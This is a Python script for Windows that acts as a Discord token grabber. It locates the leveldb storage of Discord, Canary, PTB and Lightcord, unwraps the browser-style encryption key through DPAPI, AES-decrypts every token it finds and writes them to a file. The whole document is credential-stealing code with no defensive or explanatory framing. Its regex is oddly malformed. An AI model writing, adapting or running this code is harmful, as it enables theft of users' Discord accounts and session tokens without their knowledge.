import os
import json
from re import findall
from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData


ROAMING = os.getenv("appdata")
REGEX = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*"
TOKENS = []


def get_decryption_key(path):
    with open(path, "r", encoding="utf-8") as f:
        temp = f.read()
    local = json.loads(temp)
    decryption_key = b64decode(local["os_crypt"]["encrypted_key"])
    decryption_key = decryption_key[5:]
    decryption_key = CryptUnprotectData(
        decryption_key, None, None, None, 0)[1]
    return decryption_key


def aes_decrypt(buff, master_key):
    aes_iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, aes_iv)
    decrypted = cipher.decrypt(payload)
    decrypted = decrypted[:-16].decode()
    return decrypted


def get_tokens():
    paths = {
        "Discord": ROAMING + r"\\discord\\Local Storage\\leveldb\\",
        "Discord Canary": ROAMING + r"\\discordcanary\\Local Storage\\leveldb\\",
        "Lightcord": ROAMING + r"\\Lightcord\\Local Storage\\leveldb\\",
        "Discord PTB": ROAMING + r"\\discordptb\\Local Storage\\leveldb\\",
    }

    for name, path in paths.items():
        if not os.path.exists(path):
            continue
        disc = name.replace(" ", "").lower() if name != "Lightcord" else "Lightcord"
        if os.path.exists(ROAMING + f"\\{disc}\\Local State"):
            for file_name in os.listdir(path):
                if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                    continue
                with open(f"{path}/{file_name}", errors="ignore", encoding="UTF-8") as file:
                    for line in file.readlines():
                        for match in findall(REGEX, line.strip()):
                            token = aes_decrypt(b64decode(match.split("dQw4w9WgXcQ:")[1]), get_decryption_key(ROAMING+"\\discord\\Local State"))
                            if token not in TOKENS:
                                TOKENS.append(token)

    with open("tokens.txt", "w", encoding="UTF-8") as file:
        file.writelines("\n".join(TOKENS))


if __name__ == "__main__" and os.name == "nt":
    get_tokens()
